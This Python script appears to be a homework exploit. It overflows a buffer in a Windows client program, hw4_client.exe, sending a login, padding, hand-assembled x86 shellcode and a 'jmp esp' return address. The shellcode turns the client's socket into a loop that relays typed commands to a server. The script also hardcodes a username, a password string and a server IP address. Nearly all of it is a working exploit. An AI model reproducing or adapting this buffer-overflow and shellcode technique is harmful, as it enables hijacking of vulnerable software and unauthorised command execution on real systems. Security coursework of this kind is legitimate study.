import subprocess
import asyncio
import os


def main():
    payload_size = 1000 * 4 + 870 * 5 + 19
    data_size = 2000

    payload = b"uArcher\n"
    payload += b"0N1K02HH0FEQXXAA\n"

    # placeholder for data
    payload += b"A" * (data_size)

    # code
    #payload += b"\xcc"
    payload += b"\x8B\x5C\x24\x0C"      # mov ebx, [esp+12]     ; socket
    payload += b"\xB8\x39\x1B\xA0\xFF"  # mov eax, 0xFFA01B39   ; 0x005fe4c7 payload data
    payload += b"\xF7\xD8"              # neg eax
    payload += b"\xC1\xE8\x02"          # shr eax, 2
    payload += b"\xC1\xE0\x02"          # shl eax, 2
    payload += b"\x89\xC4"              # mov esp, eax

    ## put command to the server ...
    payload += b"\xcc"
    payload += b"\x68\x4A\x60\x50\x62"  # push 0x6250604A         ;"51.144.113.30"
    payload += b"\xB8\xEC\x4B\x50\x62"  # mov eax, 0x62504BEC
    payload += b"\xFF\xD0"              # call eax                  ; printf
    payload += b"\x58"  # pop eax

    payload += b"\x68\x80\x80\x50\x62"  # push 0x62508080        ; cmnd buffer ptr
    payload += b"\x68\x68\x61\x50\x62"  # push 0x62506168        ; "%s"
    payload += b"\xB8\xD4\x4B\x50\x62"  # mov eax,0x62504bd4
    payload += b"\xFF\xD0"              # call eax              ;scanf("%s", cmnd buffer ptr)
    payload += b"\x58"                  # pop eax               ; clear stack ("%s")

    ## check if exit

    ## call server
    payload += b"\x53"                  # push ebx              ; socket0x62506168
    payload += b"\xB8\xCB\x15\x50\x62"  # mov eax, 0x625015CB
    payload += b"\xFF\xD0"              # call eax              ; send to server
    payload += b"\x5B"                  # pop ebx               ; socket
    payload += b"\xB8\xEC\x4B\x50\x62"  # mov eax, 0x62504BEC
    payload += b"\xFF\xD0"              # call eax              ; printf
    payload += b"\x58"                  # pop eax

    #payload += b"\x6A\xFF"              # push -1               ; EOF



    #temp
    #payload += b"\x6A\xFF\xB8\x0C\x4D\x50\x62\xFF\xD0" #exit(-1)
    #####

    ##all over again...
    payload += b"\xE9\xDE\xFF\xFF\xFF"  # jmp -31               ; back to scanf

    # fill with nops until return address
    payload += b"\x90" * (payload_size - len(payload))

    # return address
    payload += b"\x28\x20\x50\x62"  # 0x62502028: jmp esp;

    # code to execute (esp)
    #payload += b"\xcc"
    payload += b"\xB8\x38\x1B\xA0\xFF"  # mov eax, 0xFFA01B38 ; (neg 0x005fe4c8)
    payload += b"\xF7\xD8"              # neg eax
    payload += b"\xFF\xE0"              # jmp eax ; go to payload code
    payload += b"\x90"
    payload += b"\n"

    #payload += b"PEEK: ; date\n"
    #payload += b"data\n"
    #payload += b"exit\n"


    proc = subprocess.Popen("D:\projects\HW4\hw4_client.exe PEEK", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT)
    #proc = asyncio.subprocess.create_subprocess_exec("D:\projects\HW4\hw4_client.exe PEEK", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
    #                        stderr=subprocess.STDOUT)

    #login = b"uArcher\n"
    #login += b"0N1K02HH0FEQXXAA\n"

    #input('go')

    proc.stdin.write(payload)


    while True:
        for line in proc.stdout:
            if os.name == 'nt':  # windows
                line = line.replace(b'\r', b'')
                if line == "51.144.113.30":
                    break
                else:
                    print(line.decode("utf-8"))

        inin = bytes(input().encode("utf-8")) + b"\n"
        proc.stdin.write(inin)
        #outs = proc.stdout.read()








    #outs, errs = proc.communicate(input=payload)


        #errs = errs.replace(b'\r', b'')


    #print("stderr: \n", errs.decode("utf-8"))
    #print("return code: ", proc.returncode)



if __name__ == "__main__":
    main()